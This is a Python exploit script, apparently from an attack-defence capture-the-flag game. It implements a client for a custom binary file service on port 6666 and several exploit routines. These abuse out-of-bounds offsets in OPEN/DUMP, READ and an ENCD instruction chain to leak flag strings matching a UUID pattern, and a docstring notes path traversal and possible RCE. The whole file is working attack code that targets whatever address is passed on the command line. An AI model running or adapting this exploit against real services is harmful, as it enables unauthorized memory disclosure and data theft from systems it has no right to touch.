import sys, socket, re, os

class Client(object):
    def __init__(self, remote):
        self.remote = remote

    def connect(self, empty):
        self.s = socket.socket()
        self.s.connect((self.remote, 6666))

    def OPEN(self, filename):
        self.s.send(b"\x01" + filename)
        return self.s.recv(0x40)

    def DUMP(self, offset):
        self.s.send(b"\x02" + offset)
        return self.s.recv(0x40)

    def REST(self, offset):
        self.s.send(b"\x03" + offset)
        return self.s.recv(0x40)

    def CLSE(self, empty):
        self.s.send(b"\x04")
        return self.s.recv(0x40)

    def WRTE(self, content):
        self.s.send(b"\x05" + content)
        return self.s.recv(0x40)

    def READ(self, offset):
        self.s.send(b"\x06" + offset)
        return self.s.recv(0x40)

    def ENCD(self, offset):
        self.s.send(b"\x07" + offset)
        return self.s.recv(0x40)

    def SHFT(self, offset):
        self.s.send(b"\x08" + offset)
        return self.s.recv(0x40)

    def LIST(self, offset):
        self.s.send(b"\x09" + offset)
        return self.s.recv(0x40)

    def LOAD(self, empty):
        self.s.send(b"\x0A")
        return self.s.recv(0x40)

    def SAVE(self, empty):
        self.s.send(b"\x0B")
        return self.s.recv(0x40)

    def AUTH(self, uid):
        #print(uid)
        self.s.send(b"\x0C" + uid)
        return self.s.recv(0x40)

    def HELL(self, empty):
        self.s.send(b"\x0D")
        return self.s.recv(0x40)

    def TERM(self, empty):
        self.s.send(b"\x0F")
        retval = self.s.recv(0x40)
        self.s.close()
        return retval

class Exploits(object):
    def __init__(self, address):
        self.client = Client(address)
    '''
        + path traversal in OPEN
        + .savefile DUMP shellcode injection RCE possibility
    '''
    def put_data(self):
        self.client.connect("")
        self.client.AUTH(b"\xde\xad\xbe\xef\xde\xad\xbe\xef"[::-1])
        self.client.WRTE(b"SAMPLE_TEXTSAMPLE_TEXTSAMPLE_TEXTSAMPLE_TEXT")
        self.client.TERM("")

    def OPEN_DUMP_overflow(self):
        #self.put_data()
        for i in range(-4,4):
            self.client.connect("")
            self.client.AUTH(b"\xde\xad\xbe\xef\xde\xad\xbe\xef"[::-1])
            for j in range(8):
                exploit_name = b"EXAMPLE_FILEEXAMPLE_FILEEXAMPLE"
                if (i*j) < 0:
                    exploit_name += bytes([0x40, 0xff+(i*j)])
                else:
                    exploit_name += bytes([0x40, 0x00+(i*j)])
                self.client.OPEN(exploit_name)
                self.client.CLSE("")
                self.client.OPEN(b"EXPLOIT")
                self.client.DUMP(b"\x00\x00\x40\x00")
                self.client.SHFT(b"\x00")
                self.client.REST(b"\x00\x00\x40\x00")
                result = self.client.READ(b"\x00\x00\x40\x00")[4:40].decode(errors="backslashreplace")
                if re.findall(r"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}", result):
                    print(result)
                self.client.CLSE("")
            self.client.TERM("")

    def READ_amwr(self):
        #self.put_data()
        self.client.connect("")
        for i in range(-32,32):
            if i < 0:
                offset = bytes([0x40, 0xff+i])
            elif i > 0:
                offset = bytes([0x40, 0x00+i])
            else:
                continue
            result = self.client.READ(offset + b"\x40\x00")[4:40].decode(errors="backslashreplace")
            if re.findall(r"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}", result):
                print(result)
        self.client.TERM("")

    def ENCD_amwr_rce(self):
        #self.put_data()
        for i in range(-4,4):
            self.client.connect("")
            self.client.AUTH(b"\xde\xad\xbe\xef\xde\xad\xbe\xef"[::-1])
            for j in range(8):
                if i < 0:
                    instructions =  b"SHB "
                elif i > 0:
                    instructions =  b"SHF "
                else:
                    continue
                instructions += f"{abs((i*j)):02x}80".encode()
                if i < 0:
                    instructions += b";CPY     ;SHF "
                elif i > 0:
                    instructions += b";CPY     ;SHB "
                instructions += f"{abs((i*j)):02x}80".encode()
                instructions += b";XOS     ;XOR 3131;END     ;"
                #print(instructions)
                self.client.WRTE(instructions)
                self.client.LOAD("")
                self.client.SHFT(b"\x00")
                self.client.WRTE(b"111111111111111111111111111111111111111111111111111111111111111")
                self.client.SHFT(b"\x00")
                self.client.ENCD(b"\x00")
                result = self.client.READ(b"\x00\x00\x40\x00")[4:40].decode(errors="backslashreplace")
                if re.findall(r"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}", result):
                    print(result)
            self.client.TERM("")

address = sys.argv[1]
exploits = Exploits(address)
exploits.ENCD_amwr_rce()